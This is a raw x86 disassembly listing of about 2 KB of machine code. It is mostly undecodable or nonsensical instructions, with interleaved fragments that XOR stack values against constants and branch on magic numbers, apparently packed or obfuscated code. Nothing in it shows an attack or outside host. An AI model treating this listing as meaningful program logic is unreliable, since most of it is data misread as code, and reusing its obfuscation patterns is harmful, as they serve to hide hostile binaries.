  4020a5:	adc    ebx,DWORD PTR [ecx+0x37]
  4020a8:	icebp  
  4020a9:	(bad)  
  4020aa:	sti    
  4020ab:	(bad)  
  4020ac:	shl    BYTE PTR [edx],0x79
  4020af:	arpl   WORD PTR ds:0x7c3c9f7f,bp
  4020b5:	stc    
  4020b6:	sub    BYTE PTR [ecx-0x68],dl
  4020b9:	mov    eax,es:0xb7f8df2
  4020bf:	or     bh,BYTE PTR [ebx]
  4020c1:	xchg   DWORD PTR [ebp+edi*1+0x24],ebx
  4020c5:	cmp    edx,DWORD PTR [edi]
  4020c7:	xor    eax,0x40539ad3
  4020cc:	mov    ah,0xca
  4020ce:	ficomp DWORD PTR [esi]
  4020d0:	adc    bh,bl
  4020d2:	xchg   ebx,eax
  4020d3:	sbb    eax,0x21a672c0
  4020d8:	adc    BYTE PTR [ecx+0x6c],al
  4020db:	pop    edi
  4020dc:	add    BYTE PTR [esi],al
  4020de:	pushf  
  4020df:	and    BYTE PTR [esi],ah
  4020e1:	sbb    DWORD PTR [esi+0x20],esp
  4020e4:	mov    DWORD PTR [edx+ecx*8],ecx
  4020e7:	push   ss
  4020e8:	sub    edx,ebx
  4020ea:	jmp    0x367:0xd748e70b
  4020f1:	add    al,0x6
  4020f3:	push   es
  4020f4:	push   0xffffffe4
  4020f6:	jmp    0x5e8a22ee
  4020fb:	mov    esp,0x450882cd
  402100:	sahf   
  402101:	push   es
  402102:	lods   eax,DWORD PTR ds:[esi]
  402103:	sar    DWORD PTR [edx+0x2d],0xd0
  402107:	std    
  402108:	shl    DWORD PTR [ecx+eax*2-0x19],0x67
  40210d:	bnd jne 0x40211b
  402110:	push   eax
  402111:	and    dl,dl
  402113:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402114:	push   ebx
  402115:	fstp   TBYTE PTR [ebp+ebx*4+0x107efc53]
  40211c:	es mov ecx,0x802c9639
  402122:	jp     0x4020d0
  402124:	jmp    0x402174
  402126:	stos   DWORD PTR es:[edi],eax
  402127:	ss and BYTE PTR cs:[ebx+0x834ef96],al
  40212f:	test   BYTE PTR cs:0x76eefed2,cl
  402136:	les    ecx,FWORD PTR [ebx-0x46]
  402139:	dec    eax
  40213a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40213b:	fstp   DWORD PTR [ecx+ecx*4+0x44c3dc31]
  402142:	or     DWORD PTR [ecx+0x44],ebx
  402145:	out    0xfe,eax
  402147:	mov    ah,0xa7
  402149:	sbb    eax,0x4f06f1f3
  40214e:	pop    ebx
  40214f:	(bad)  
  402150:	rol    BYTE PTR [ecx+edi*2-0x64a2c134],cl
  402157:	or     esi,0xffffffc9
  40215a:	xor    al,0x16
  40215c:	fnstcw WORD PTR [ebx]
  40215e:	ins    DWORD PTR es:[edi],dx
  40215f:	pop    esp
  402160:	mov    bl,0x32
  402162:	test   DWORD PTR [ecx+0x16d970cc],esp
  402168:	xor    BYTE PTR [ecx+0x1b],al
  40216b:	ds push esp
  40216d:	hlt    
  40216e:	call   DWORD PTR [esi]
  402170:	push   ebp
  402171:	popf   
  402172:	jmp    0x7adab6df
  402177:	enter  0xba8,0x2c
  40217b:	xor    BYTE PTR [eax],bl
  40217d:	aam    0x2e
  40217f:	frstor ss:[edi+0x19]
  402183:	test   DWORD PTR [edx+0x58fd7982],eax
  402189:	sub    cl,BYTE PTR [edi]
  40218b:	dec    ebx
  40218c:	sub    eax,0x42236505
  402191:	jmp    0x402142
  402193:	and    al,0x6a
  402195:	mov    esi,0x8cc01f37
  40219a:	and    cl,ah
  40219c:	and    DWORD PTR [esp+edx*1],ebx
  40219f:	mov    edi,0xa66a1826
  4021a4:	inc    DWORD PTR [ebx+0x39]
  4021a7:	out    dx,al
  4021a8:	inc    ebp
  4021a9:	jmp    0xded8feae
  4021ae:	push   0x38da5bc1
  4021b3:	fwait
  4021b4:	xchg   ebp,eax
  4021b5:	shl    BYTE PTR [edi+0x41],1
  4021b8:	dec    BYTE PTR [ebx-0x49]
  4021bb:	mov    bh,0x31
  4021bd:	lods   al,BYTE PTR ds:[esi]
  4021be:	je     0x4021f6
  4021c0:	mov    ds:0x90e11cc1,eax
  4021c5:	push   ebx
  4021c6:	push   esp
  4021c7:	mov    eax,ds:0x6adedaa6
  4021cc:	xchg   edi,eax
  4021cd:	test   eax,0x2d6956c6
  4021d2:	or     ebx,DWORD PTR [edi-0x21]
  4021d5:	int3   
  4021d6:	mov    ds:0x4b0c9e6e,eax
  4021db:	sbb    DWORD PTR [edx+0x64],esi
  4021de:	imul   ecx,esp,0xf456127e
  4021e4:	repz je 0x40217a
  4021e7:	ss push edi
  4021e9:	xchg   bx,bx
  4021ec:	adc    edx,ebx
  4021ee:	xchg   esi,eax
  4021ef:	push   edx
  4021f0:	push   ebp
  4021f1:	call   0x7e08:0xe7d22258
  4021f8:	dec    esi
  4021f9:	aad    0xd7
  4021fb:	mov    esi,0x22d42daf
  402200:	iret   
  402201:	fimul  DWORD PTR [edi-0x69]
  402204:	cmp    cl,ah
  402206:	cmp    BYTE PTR [esi+0x37],ch
  402209:	sub    DWORD PTR [edi+0x45254a22],0xfffffffb
  402210:	or     BYTE PTR [edi+0x1ebfa4e7],ah
  402216:	mov    al,0x53
  402218:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402219:	mov    ah,BYTE PTR [edx+0x44be2501]
  40221f:	imul   DWORD PTR [esi]
  402221:	cwde   
  402222:	repz inc edi
  402224:	jo     0x4021c9
  402226:	sahf   
  402227:	in     al,dx
  402228:	popa   
  402229:	(bad)  
  40222a:	cld    
  40222b:	pop    edi
  40222c:	imul   edi,DWORD PTR [edx+0x1d6e31df],0xffffffe7
  402233:	sub    BYTE PTR [edi+0x6d],dl
  402236:	sbb    ebx,DWORD PTR ds:0xa41695cd
  40223c:	std    
  40223d:	out    0x2b,al
  40223f:	fistp  DWORD PTR [eax+0x75]
  402242:	inc    edx
  402243:	jns    0x402242
  402245:	ror    DWORD PTR ds:0xc2e75544,1
  40224b:	icebp  
  40224c:	dec    esp
  40224d:	push   cs
  40224e:	inc    ebp
  40224f:	jmp    0x4021f8
  402251:	add    DWORD PTR [ebx+0x55b659ac],0x28fc18ec
  40225b:	or     dl,dh
  40225d:	adc    esp,DWORD PTR ss:[edi-0x6db1798]
  402264:	adc    eax,0x2af6d4cd
  402269:	mov    dl,0x16
  40226b:	lahf   
  40226c:	fst    QWORD PTR [ebp+esi*8-0x5e]
  402270:	push   ds
  402271:	jg     0x4022e7
  402273:	das    
  402274:	std    
  402275:	mov    eax,ds:0x481840f
  40227a:	add    BYTE PTR [eax],al
  40227c:	mov    eax,DWORD PTR [ebp-0x14]
  40227f:	xor    eax,ecx
  402281:	add    eax,esi
  402283:	mov    DWORD PTR [ebp-0x30],eax
  402286:	mov    eax,DWORD PTR [ebp-0x34]
  402289:	jmp    0x4024a6
  40228e:	jp     0x40222b
  402290:	sbb    al,0xe8
  402292:	cdq    
  402293:	ja     0x402267
  402295:	jno    0x40227a
  402297:	sbb    al,0x20
  402299:	sub    DWORD PTR [eax+0x70b06f84],edi
  40229f:	add    dh,BYTE PTR [eax+0x70]
  4022a2:	jo     0x402322
  4022a4:	jo     0x402316
  4022a6:	xor    eax,0x4c6cb4f5
  4022ab:	cmp    eax,0x98ddf2cf
  4022b0:	fisttp DWORD PTR [edi+0x4a]
  4022b3:	or     eax,0xbe533037
  4022b8:	scas   eax,DWORD PTR es:[edi]
  4022b9:	into   
  4022ba:	or     BYTE PTR [edx],0x3c
  4022bd:	(bad)  
  4022be:	ja     0x4022d7
  4022c0:	stc    
  4022c1:	pop    edx
  4022c2:	inc    ecx
  4022c3:	(bad)  
  4022c4:	aaa    
  4022c5:	fisub  DWORD PTR [edx+0x16]
  4022c8:	popa   
  4022c9:	iret   
  4022ca:	or     al,BYTE PTR [eax+0x4f]
  4022cd:	mov    cl,0x83
  4022cf:	push   cs
  4022d0:	outs   dx,BYTE PTR ds:[esi]
  4022d1:	popf   
  4022d2:	xor    DWORD PTR [eax+0x43],0xaaf072ad
  4022d9:	loopne 0x40227f
  4022db:	push   edi
  4022dc:	cmp    eax,DWORD PTR [ebx-0x20359cd6]
  4022e2:	xchg   ebp,eax
  4022e3:	je     0x40235a
  4022e5:	xchg   ebp,eax
  4022e6:	punpckldq mm4,DWORD PTR [ebp+0x5994e2af]
  4022ed:	inc    esp
  4022ee:	sub    eax,0x6d285c5b
  4022f3:	leave  
  4022f4:	scas   eax,DWORD PTR es:[edi]
  4022f5:	loopne 0x4022bc
  4022f7:	mov    BYTE PTR [ecx],bl
  4022f9:	sbb    DWORD PTR [eiz*8-0xd653968],0xb713decb
  402304:	pop    ds
  402305:	mov    ebp,0x232409b2
  40230a:	ret    
  40230b:	(bad)  
  40230c:	outs   dx,DWORD PTR ds:[esi]
  40230d:	mov    dh,0xa2
  40230f:	lea    ebp,[edx+0x722ac54f]
  402315:	inc    edi
  402316:	test   BYTE PTR [ebx-0x486c9dfb],ch
  40231c:	push   eax
  40231d:	jo     0x4022a9
  40231f:	jae    0x40237b
  402321:	jae    0x402380
  402323:	lea    esp,[ebx-0x7a12bc65]
  402329:	xor    BYTE PTR [esi-0x3bc5cc93],dh
  40232f:	pop    edx
  402330:	xchg   edi,eax
  402331:	jmp    0x4023a4
  402333:	mov    dl,0xf4
  402335:	js     0x4022f0
  402337:	xchg   ecx,eax
  402338:	pushf  
  402339:	xchg   esi,eax
  40233a:	outs   dx,DWORD PTR ds:[esi]
  40233b:	adc    bh,BYTE PTR [eax-0x48]
  40233e:	push   ebx
  40233f:	fimul  DWORD PTR [edx]
  402341:	and    BYTE PTR [ecx-0x102d4343],0xe
  402348:	das    
  402349:	sahf   
  40234a:	push   ebp
  40234b:	fs dec esp
  40234d:	jp     0x40235d
  40234f:	pop    edi
  402350:	clc    
  402351:	sbb    eax,0xccb2dfc8
  402356:	into   
  402357:	clc    
  402358:	cdq    
  402359:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40235a:	mov    ch,0x83
  40235c:	adc    dh,BYTE PTR [ecx]
  40235e:	aas    
  40235f:	xchg   edi,eax
  402360:	ret    
  402361:	cwde   
  402362:	inc    edi
  402363:	jle    0x4023aa
  402365:	pop    ss
  402366:	inc    edi
  402367:	push   ebx
  402368:	jns    0x4023d2
  40236a:	xchg   DWORD PTR [eax+0x47],ecx
  40236d:	or     DWORD PTR [esi+0x78fd33c6],0x57
  402374:	lds    esi,FWORD PTR [ecx+0x6b]
  402377:	jmp    0x4023c6
  402379:	icebp  
  40237a:	mov    edi,0x1a06c853
  40237f:	les    ecx,FWORD PTR [edi+ecx*2+0xe]
  402383:	outs   dx,BYTE PTR ds:[esi]
  402384:	(bad)  
  402385:	div    DWORD PTR ds:[eax+0x51]
  402389:	popa   
  40238a:	mov    ch,0x69
  40238c:	jns    0x4023a2
  40238e:	push   ecx
  40238f:	mov    esi,0x9beaab3b
  402394:	push   esi
  402395:	push   ebx
  402396:	leave  
  402397:	push   ebp
  402398:	pushf  
  402399:	push   cs
  40239a:	lahf   
  40239b:	clc    
  40239c:	fidivr DWORD PTR [esi+edi*8-0x2d]
  4023a0:	scas   eax,DWORD PTR es:[edi]
  4023a1:	jo     0x4023ca
  4023a3:	or     edi,DWORD PTR [ecx-0x27]
  4023a6:	sub    al,0xaa
  4023a8:	cmp    al,0xed
  4023aa:	std    
  4023ab:	xor    eax,0x9b576850
  4023b0:	push   DWORD PTR fs:[ebx]
  4023b3:	mov    al,ds:0x32168332
  4023b8:	jp     0x4023a8
  4023ba:	imul   esi,DWORD PTR [eax],0x71
  4023bd:	jnp    0x40235d
  4023bf:	mov    bh,0x4f
  4023c1:	les    esi,FWORD PTR [esi-0x6cac3db7]
  4023c7:	sbb    ecx,edi
  4023c9:	mov    bh,0x2a
  4023cb:	dec    esi
  4023cc:	cmc    
  4023cd:	test   BYTE PTR [ebx],bl
  4023cf:	dec    esi
  4023d0:	jo     0x402422
  4023d2:	clc    
  4023d3:	lock loop 0x40243e
  4023d6:	shl    DWORD PTR [esi+0x34],cl
  4023d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023db:	(bad)  
  4023dc:	outs   dx,BYTE PTR ds:[esi]
  4023dd:	out    dx,al
  4023de:	pop    DWORD PTR [edi+eax*4]
  4023e1:	push   eax
  4023e2:	cmp    BYTE PTR [edi+0x656184cb],al
  4023e8:	jmp    0x38fa:0x7fa71a67
  4023ef:	shl    DWORD PTR gs:[ecx],cl
  4023f2:	mov    ch,0xdb
  4023f4:	jp     0x40243c
  4023f6:	push   ebp
  4023f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023f8:	inc    ebp
  4023f9:	adc    BYTE PTR [edi+0x7a],bl
  4023fc:	or     BYTE PTR [ebx+0x4e874cff],dl
  402402:	cmc    
  402403:	push   ds
  402404:	mov    ds:0xef2e74f2,eax
  402409:	dec    eax
  40240a:	stos   DWORD PTR es:[edi],eax
  40240b:	(bad)  
  40240c:	xchg   esp,eax
  40240d:	or     bl,0xa
  402410:	pop    es
  402411:	xchg   esp,eax
  402412:	pop    ds
  402413:	in     al,dx
  402414:	pop    edx
  402415:	xor    bh,bh
  402417:	das    
  402418:	retf   0x26bb
  40241b:	pop    edi
  40241c:	add    ch,BYTE PTR [esi-0x39]
  40241f:	mov    ds,WORD PTR [edx+0x46]
  402422:	cwde   
  402423:	and    al,0x84
  402425:	ins    DWORD PTR es:[edi],dx
  402426:	push   0xffffffb7
  402428:	shl    BYTE PTR [edx-0x5ea7684f],cl
  40242e:	fsubr  st,st(2)
  402430:	jnp    0x40243a
  402432:	mov    ah,0x2d
  402434:	mov    ebx,0xf9302f28
  402439:	ss mov ah,0x2e
  40243c:	out    dx,al
  40243d:	mov    ds:0x93ad7f2e,eax
  402442:	push   cs
  402443:	inc    edx
  402444:	push   ebx
  402445:	dec    ebp
  402446:	pop    esp
  402447:	test   eax,0xfb4b879c
  40244c:	xlat   BYTE PTR ds:[ebx]
  40244d:	or     esp,DWORD PTR [eax]
  40244f:	mov    ecx,0x17099062
  402454:	pop    ebp
  402455:	pop    ebp
  402456:	je     0x4023e7
  402458:	dec    ecx
  402459:	fwait
  40245a:	call   0x3d09:0xb0529220
  402461:	mov    dh,0x87
  402463:	in     al,0xf9
  402465:	push   ecx
  402466:	pop    ecx
  402467:	mov    gs,ebx
  402469:	xchg   esp,eax
  40246a:	test   BYTE PTR [esi+ebp*2-0x27636c5d],0x1d
  402472:	jecxz  0x402499
  402474:	lahf   
  402475:	xchg   ecx,eax
  402476:	xchg   esp,eax
  402477:	scas   eax,DWORD PTR es:[edi]
  402478:	mov    al,0x19
  40247a:	mov    ds:0x1671914b,eax
  40247f:	cdq    
  402480:	clc    
  402481:	sbb    esi,DWORD PTR [eax-0x712c76c0]
  402487:	sub    al,0xc9
  402489:	add    al,BYTE PTR ds:0x5ff2dc2a
  40248f:	popf   
  402490:	push   ds
  402491:	in     al,0x10
  402493:	pop    ebp
  402494:	cli    
  402495:	ds sbb ch,al
  402498:	push   ss
  402499:	aam    0xf5
  40249b:	and    DWORD PTR [edx],ebx
  40249d:	ficom  WORD PTR [esi-0x1]
  4024a0:	inc    esp
  4024a1:	or     esi,DWORD PTR [ebp+0x665ae565]
  4024a7:	mov    edx,DWORD PTR [ebp-0x38]
  4024aa:	mov    ebx,0x8a3e
  4024af:	xor    dx,bx
  4024b2:	mov    ebx,DWORD PTR [ebp-0x8]
  4024b5:	add    dx,di
  4024b8:	movzx  edx,dx
  4024bb:	xor    ebx,ecx
  4024bd:	lea    edx,[edx+ebx*1+0x32729c]
  4024c4:	add    DWORD PTR [eax],edx
  4024c6:	mov    eax,DWORD PTR [ebp-0x2c]
  4024c9:	mov    edx,DWORD PTR [ebp-0x8]
  4024cc:	mov    ebx,DWORD PTR [ebp-0x30]
  4024cf:	xor    edx,ecx
  4024d1:	add    edx,esi
  4024d3:	imul   edx,ebx
  4024d6:	sub    DWORD PTR [eax],edx
  4024d8:	mov    eax,DWORD PTR [ebp-0x14]
  4024db:	jmp    0x402730
  4024e0:	jmp    0x4026fd
  4024e5:	and    DWORD PTR [edi+edi*4+0x31714d76],esi
  4024ec:	jae    0x40250e
  4024ee:	xor    BYTE PTR [ecx+0xbbcd437],cl
  4024f4:	and    eax,0x70700070
  4024f9:	jo     0x402579
  4024fb:	jo     0x40256d
  4024fd:	icebp  
  4024fe:	out    dx,al
  4024ff:	push   es
  402500:	sub    BYTE PTR [ecx-0x6a508cd7],ch
  402506:	sub    DWORD PTR [ecx],ebp
  402508:	mov    dh,0xf
  40250a:	or     BYTE PTR [esp+ebx*2-0x3c394325],ah
  402511:	ss inc ecx
  402513:	mov    bl,0x60
  402515:	jl     0x402502
  402517:	pop    ebp
  402518:	cli    
  402519:	stos   BYTE PTR es:[edi],al
  40251a:	es ror al,0x18
  40251e:	sub    al,0x89
  402520:	dec    BYTE PTR [ebx+0x26de6c50]
  402526:	rcl    DWORD PTR [edx+0x28],1
  402529:	sbb    cl,BYTE PTR [ecx]
  40252b:	out    dx,al
  40252c:	pop    edx
  40252d:	sbb    BYTE PTR [eiz*8+0x616c1bdd],cl
  402534:	mov    edi,edi
  402536:	sbb    al,0xff
  402538:	daa    
  402539:	adc    eax,0xe39e6a75
  40253e:	and    ebx,DWORD PTR [esi]
  402540:	nop
  402541:	jmp    0x402564
  402543:	xchg   esi,eax
  402544:	icebp  
  402545:	or     eax,0x2a9c707f
  40254a:	je     0x40251a
  40254c:	or     al,0x50
  40254e:	aaa    
  40254f:	dec    edx
  402550:	xchg   ebx,ebp
  402552:	and    BYTE PTR [edi-0x6d],al
  402555:	jecxz  0x402546
  402557:	mov    dl,bl
  402559:	inc    ebp
  40255a:	cwde   
  40255b:	ja     0x4025b5
  40255d:	jp     0x402587
  40255f:	outs   dx,BYTE PTR ds:[esi]
  402560:	xchg   DWORD PTR [esi+eiz*2],esp
  402563:	mov    ebp,0xdef565d5
  402568:	test   cl,bl
  40256a:	dec    eax
  40256b:	das    
  40256c:	in     eax,0xf6
  40256e:	push   ds
  40256f:	add    esp,DWORD PTR [esi]
  402571:	aam    0x76
  402573:	mov    ds:0xdba19866,al
  402578:	call   0xc950e4a0
  40257d:	cdq    
  40257e:	jno    0x4025f4
  402580:	sub    bl,bh
  402582:	mov    edx,0x96986a41
  402587:	out    dx,eax
  402588:	pop    ebp
  402589:	arpl   WORD PTR [edi-0x227d2f33],di
  40258f:	stos   BYTE PTR es:[edi],al
  402590:	ret    0xceb5
  402593:	in     eax,0xa6
  402595:	rol    ecx,0xda
  402598:	lds    eax,FWORD PTR [eax+0x5ba11012]
  40259e:	test   eax,0x62b7d43c
  4025a3:	or     ah,dh
  4025a5:	or     BYTE PTR [esi+0x43],dh
  4025a8:	and    al,0x73
  4025aa:	fwait
  4025ab:	or     ebp,DWORD PTR [esi-0x18]
  4025ae:	dec    edx
  4025af:	push   ss
  4025b0:	in     eax,dx
  4025b1:	lds    edx,FWORD PTR [ebp-0x65]
  4025b4:	push   edi
  4025b5:	test   DWORD PTR [ebx+0x3f],edx
  4025b8:	jno    0x402553
  4025ba:	mov    al,ds:0xff7b9164
  4025bf:	inc    ebx
  4025c0:	inc    edx
  4025c1:	cmp    BYTE PTR es:0x4386453c,ch
  4025c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025c9:	sbb    eax,0xb6a54318
  4025ce:	inc    esi
  4025cf:	cmp    eax,0x1973980a
  4025d4:	(bad)  
  4025d6:	or     DWORD PTR cs:[ecx+0x381ab72d],0xffffff9e
  4025de:	stos   BYTE PTR es:[edi],al
  4025df:	push   ss
  4025e0:	mov    ecx,0xf635fac0
  4025e5:	call   DWORD PTR ds:0x519e93e3
  4025eb:	xchg   ebp,eax
  4025ec:	and    BYTE PTR [ebx-0x2b],bl
  4025ef:	push   edx
  4025f0:	in     al,0x44
  4025f2:	or     eax,0xabb555ba
  4025f7:	out    0xf,eax
  4025f9:	scas   eax,DWORD PTR es:[edi]
  4025fa:	arpl   WORD PTR [ecx],di
  4025fc:	psllw  mm4,mm0
  4025ff:	loop   0x402648
  402601:	xor    dl,BYTE PTR [edi+0x5c]
  402604:	das    
  402605:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402606:	nop
  402607:	dec    ebx
  402608:	lahf   
  402609:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40260a:	dec    ecx
  40260b:	sub    eax,0x8a8c432f
  402610:	iret   
  402611:	js     0x402647
  402613:	sbb    DWORD PTR [ecx+0x3ab5aed],edx
  402619:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40261a:	leavew 
  40261c:	imul   ecx,DWORD PTR [eax+edx*8],0xe7149d40
  402623:	imul   edi,DWORD PTR [esi+0x51918943],0xc
  40262a:	mov    edx,0x856843c9
  40262f:	stos   BYTE PTR es:[edi],al
  402630:	sub    DWORD PTR [ebx],edx
  402632:	fldcw  WORD PTR [edx+0x7b2937dd]
  402638:	xchg   edx,eax
  402639:	cli    
  40263a:	mov    dl,0x26
  40263c:	sbb    eax,0xdff703b4
  402641:	pushf  
  402642:	jmp    0x80a0da86
  402647:	rcl    DWORD PTR [ebp-0x121eabf9],cl
  40264d:	jl     0x402679
  40264f:	std    
  402650:	sub    DWORD PTR [edi],esi
  402652:	cmp    esi,ecx
  402654:	add    eax,0xe5f9ca8d
  402659:	dec    eax
  40265a:	and    eax,0x951ee502
  40265f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402660:	(bad)  
  402661:	(bad)  
  402662:	(bad)  
  402663:	es stc 
  402665:	dec    esp
  402666:	out    dx,al
  402667:	mov    bh,0x4e
  402669:	addr16 push ds
  40266b:	in     al,0xc2
  40266d:	arpl   WORD PTR [esi+0x25717289],ax
  402673:	test   DWORD PTR [esi+0x1b],edi
  402676:	push   0x10313d70
  40267b:	mov    ah,0xd4
  40267d:	bound  ebx,QWORD PTR [edi+0x1836ea33]
  402683:	sbb    BYTE PTR [esi+0x2d7ed85d],bh
  402689:	inc    eax
  40268a:	out    dx,eax
  40268b:	mov    WORD PTR [edx-0x1b1c2fe3],cs
  402691:	or     bh,BYTE PTR [ebx+0x50]
  402694:	cld    
  402695:	ret    
  402696:	pop    edi
  402697:	dec    edi
  402698:	(bad)  
  402699:	ds popf 
  40269b:	push   ss
  40269c:	push   esp
  40269d:	call   0x7c5136ab
  4026a2:	xor    dl,BYTE PTR [ecx-0x18]
  4026a5:	or     eax,0x4e533e52
  4026aa:	sbb    eax,0x1bff08b7
  4026af:	pushw  ss
  4026b1:	pop    esi
  4026b2:	sbb    cl,BYTE PTR [ebx]
  4026b4:	pop    ds
  4026b5:	nop
  4026b6:	shr    DWORD PTR [edx+ebx*4],cl
  4026b9:	pop    esi
  4026ba:	nop
  4026bb:	pushf  
  4026bc:	mov    al,0xef
  4026be:	cld    
  4026bf:	sub    eax,0xa506e1bd
  4026c4:	dec    edx
  4026c5:	mov    BYTE PTR [eax-0x65],bh
  4026c8:	enter  0x9fa2,0xa4
  4026cc:	js     0x402661
  4026ce:	sub    bh,al
  4026d0:	cmp    BYTE PTR [edx+0xf],dl
  4026d3:	rsqrtps xmm3,XMMWORD PTR [edx-0x183fd59]
  4026da:	jo     0x40273a
  4026dc:	mov    edx,0x57df82f7
  4026e1:	xchg   edx,eax
  4026e2:	xchg   DWORD PTR [ebx],edx
  4026e4:	xlat   BYTE PTR ds:[ebx]
  4026e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026e6:	stos   DWORD PTR es:[edi],eax
  4026e7:	lods   al,BYTE PTR ds:[esi]
  4026e8:	push   edi
  4026e9:	test   DWORD PTR [ecx+0x67c0f9a5],esp
  4026ef:	pusha  
  4026f0:	sub    dl,BYTE PTR [edx+0x4d]
  4026f3:	add    dl,BYTE PTR [edx]
  4026f5:	sbb    BYTE PTR ds:0x3a6ba37,cl
  4026fb:	sbb    eax,0xf4458b56
  402700:	mov    edx,DWORD PTR [ebp-0x18]
  402703:	xor    eax,edx
  402705:	cmp    eax,0x8cb40b7d
  40270a:	je     0x40272d
  402710:	mov    eax,DWORD PTR [ebp-0x10]
  402713:	add    DWORD PTR [eax],0x7403501
  402719:	jmp    0x40272d
  40271e:	mov    eax,DWORD PTR [ebp-0x1c]
  402721:	cmp    DWORD PTR [eax],0xf89f2da9
  402727:	jne    0x402748
  40272d:	mov    eax,DWORD PTR [ebp-0x8]
  402730:	xor    eax,ecx
  402732:	add    eax,esi
  402734:	test   eax,eax
  402736:	jne    0x402748
  40273c:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  402743:	jmp    0x4012bf
  402748:	pop    ebx
  402749:	pop    edi
  40274a:	jmp    0x402967
  40274f:	cs dec edi
  402751:	add    dl,bl
  402753:	popa   
  402754:	push   ecx
  402755:	in     eax,dx
  402756:	jno    0x4026ea
  402758:	imul   ebx,DWORD PTR [ecx+esi*8],0xaf51b377
  40275f:	jo     0x40276f
  402761:	jo     0x4027d3
  402763:	jo     0x4027e3
  402765:	jo     0x4027d7
  402767:	enter  0xdce6,0xc
  40276b:	mov    DWORD PTR [ebx+0x5bae0413],esi
  402771:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402772:	int3   
  402773:	iret   
  402774:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402775:	aaa    
  402776:	push   edi
  402777:	add    BYTE PTR [esi-0x4afbeb32],ch
  40277d:	imul   esp,DWORD PTR [ecx-0x48c29170],0x1803909e
  402787:	out    dx,eax
  402788:	sub    al,BYTE PTR ds:0xe166d886
  40278e:	xchg   ebx,eax
  40278f:	xor    DWORD PTR [edx+0x41],0x24b6b7f2
  402796:	and    eax,0x4da47dc
  40279b:	xchg   ebx,eax
  40279c:	stos   BYTE PTR es:[edi],al
  40279d:	mov    ds:0xfeac6b8c,al
  4027a2:	test   eax,0xf4ebbf1
  4027a7:	enter  0x1a8e,0xbd
  4027ab:	xchg   esi,esi
  4027ad:	dec    ebx
  4027ae:	pop    ecx
  4027af:	mov    ebx,0x55b8bfea
  4027b4:	loop   0x4027ff
  4027b6:	ds sbb al,0xf3
  4027b9:	inc    ebp
  4027ba:	cmc    
  4027bb:	push   cs
  4027bc:	xor    BYTE PTR [ecx-0x8],bl
  4027bf:	lock pop ecx
  4027c1:	add    BYTE PTR [esi+0x78],0xd5
  4027c5:	arpl   WORD PTR [ecx],dx
  4027c7:	sahf   
  4027c8:	imul   ecx,DWORD PTR [ecx-0x476abd93],0x9fcec510
  4027d2:	sbb    eax,DWORD PTR [ebx+0x22ca7170]
  4027d8:	int    0xb7
  4027da:	sub    ch,BYTE PTR [ecx-0x62]
  4027dd:	xchg   ecx,eax
  4027de:	daa    
  4027df:	mov    al,0xd1
  4027e1:	xor    BYTE PTR [esi+0x33],dl
  4027e4:	or     al,0xc2
  4027e6:	call   0xdb6d174d
  4027eb:	popf   
  4027ec:	xchg   edi,eax
  4027ed:	stos   BYTE PTR es:[edi],al
  4027ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027ef:	sahf   
  4027f0:	pop    ebp
  4027f1:	sub    bh,BYTE PTR [edx-0x3e]
  4027f4:	lds    edx,FWORD PTR [esi+ebp*8]
  4027f7:	xchg   ebp,eax
  4027f8:	outs   dx,DWORD PTR ds:[esi]
  4027f9:	push   cs
  4027fa:	ins    DWORD PTR es:[edi],dx
  4027fb:	sub    DWORD PTR [edx],0xc3a6980d
  402801:	cmp    bh,0xa1
  402804:	inc    DWORD PTR [eax+eiz*1+0x71]
  402808:	or     eax,0xf3f3fa0c
  40280d:	sbb    BYTE PTR [eax],dl
  40280f:	push   0xec48451b
  402814:	call   0xc662427f
  402819:	repz shr BYTE PTR [edi],1
  40281c:	adc    al,0x75
  40281e:	mov    BYTE PTR [eax],ah
  402820:	icebp  
  402821:	adc    eax,0x74de707a
  402826:	sbb    dl,cl
  402828:	add    ebp,DWORD PTR [ebx]
  40282a:	jb     0x402866
  40282c:	adc    al,0xf4
  40282e:	cli    
  40282f:	aaa    
  402830:	fnstenv [eax-0x54]
  402833:	fnsave ds:[ebx]
  402836:	das    
  402837:	pop    es
  402838:	mov    BYTE PTR [ebx+0x78a12dbe],ch
  40283e:	inc    eax
  40283f:	out    0x87,eax
  402841:	xor    eax,0x330ac6b2
  402846:	(bad)  
  402847:	inc    esi
  402848:	ss jae 0x402875
  40284b:	aad    0x59
  40284d:	xchg   ebx,eax
  40284e:	mov    BYTE PTR [edi-0x3b],bh
  402851:	xchg   edi,eax
  402852:	inc    ebp
  402853:	rcr    DWORD PTR [ebp-0x3b198814],cl
  402859:	xchg   ecx,eax
  40285a:	xchg   ecx,eax
  40285b:	adc    ah,ah
  40285d:	pop    edx
  40285e:	inc    ecx
  40285f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402860:	xchg   ecx,eax
  402861:	bound  esp,QWORD PTR [eax+0x7a]
  402864:	cwd    
  402866:	loope  0x402899
  402868:	pop    edx
  402869:	sbb    eax,0xa3c1607e
  40286e:	pop    edi
  40286f:	push   eax
  402870:	mov    cl,0xe6
  402872:	loop   0x402896
  402874:	cld    
  402875:	icebp  
  402876:	dec    esi
  402877:	push   es
  402878:	(bad)  
  402879:	push   ss
  40287a:	je     0x4028c2
  40287c:	fisubr WORD PTR [ecx-0x45b4632b]
  402882:	stc    
  402883:	stos   BYTE PTR es:[edi],al
  402884:	lea    edx,[ecx+0x4b]
  402887:	adc    DWORD PTR [ebx],edi
  402889:	push   ebp
  40288a:	dec    esi
  40288b:	xchg   ecx,eax
